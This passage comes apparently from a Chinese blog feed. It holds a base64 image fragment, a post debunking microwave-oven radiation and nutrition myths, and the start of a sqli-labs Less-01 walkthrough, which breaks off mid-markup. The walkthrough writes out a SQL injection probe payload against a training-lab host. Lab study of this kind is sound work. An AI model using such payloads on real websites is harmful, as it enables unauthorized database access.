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"></p>              </div>            </details><h4 id="微波炉加热食物会产生致癌物质？"><a href="#微波炉加热食物会产生致癌物质？" class="headerlink" title="微波炉加热食物会产生致癌物质？"></a>微波炉加热食物会产生致癌物质？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>想知道是否致癌，得从微波炉加热的本质说起</p><p>微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质</p><p><img src="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" class="lazyload" data-srcset="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" srcset="data:image/png;base64,666"></p>              </div>            </details><h4 id="微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？"><a href="#微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？" class="headerlink" title="微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？"></a>微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>来人，上公式</p><p><a href="https://www.helloimg.com/image/Ga0UZo"><img src="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" srcset="data:image/png;base64,666" alt="Ga0UZo.png"></a></p><p>可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来</p><p><a href="https://www.helloimg.com/image/Ga0fct"><img src="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" srcset="data:image/png;base64,666" alt="Ga0fct.jpg"></a></p>              </div>            </details><h4 id="微波炉加热的食品，会不会改变食品本身的营养成分？"><a href="#微波炉加热的食品，会不会改变食品本身的营养成分？" class="headerlink" title="微波炉加热的食品，会不会改变食品本身的营养成分？"></a>微波炉加热的食品，会不会改变食品本身的营养成分？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。</p><p>正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。</p>              </div>            </details><blockquote><p>资料参考：</p><p><a href="http://tech.sina.com.cn/e/2017-11-29/doc-ifypapmz6013246.shtml">求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn)</a></p><p><a href="https://post.smzdm.com/p/584186/">老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com)</a></p><p>部分图源必应，侵删</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="2021/11/30/sqli-labs/"/>
      <url>2021/11/30/sqli-labs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用校园网可能不能成功发送payload，切记！！！</p></blockquote><a id="more"></a><h2 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h2><ul><li><p>先判断是字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" srcset="data:image/png;base64,666" alt="Ga9XGq.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1</a> and 1=2–+</em></strong></p><hr><ul><li><p>再判断注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" srcset="data:image/png;base64,666" alt="Ga9m9b.png"></p></li></ul><p><strong><em>payload：<a 